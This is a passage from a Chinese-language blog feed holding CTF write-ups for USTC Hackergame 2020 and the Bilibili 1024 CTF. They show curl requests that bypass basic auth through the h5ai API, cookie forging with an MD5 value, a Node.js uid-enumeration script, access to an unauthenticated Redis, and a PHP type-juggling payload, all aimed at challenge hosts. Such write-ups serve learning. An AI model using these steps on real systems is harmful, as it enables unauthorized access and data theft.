<a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/9.png\" width=\"1165\" height=\"294\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/8.png\" width=\"750\" height=\"400\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/10.png\" width=\"1196\" height=\"270\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/11.png\" width=\"687\" height=\"514\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/12.png\" width=\"1371\" height=\"279\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.9/31.png\" width=\"1109\" height=\"135\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\">\n<div>USTC Hackergame 2020（中科大信安赛）write up</div>\n<div><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-11-06</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/1.png\" width=\"1901\" height=\"720\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/2.png\" width=\"830\" height=\"301\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/3.png\" width=\"751\" height=\"666\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/4.png\" width=\"1905\" height=\"853\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/5.png\" width=\"431\" height=\"731\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/6.png\" width=\"1899\" height=\"543\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/7.png\" width=\"1901\" height=\"538\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/8.png\" width=\"646\" height=\"46\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/9.png\" width=\"1897\" height=\"512\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/10.png\" width=\"1443\" height=\"870\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/11.png\" width=\"406\" height=\"168\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/12.png\" width=\"833\" height=\"573\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.3/13.png\" width=\"689\" height=\"145\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 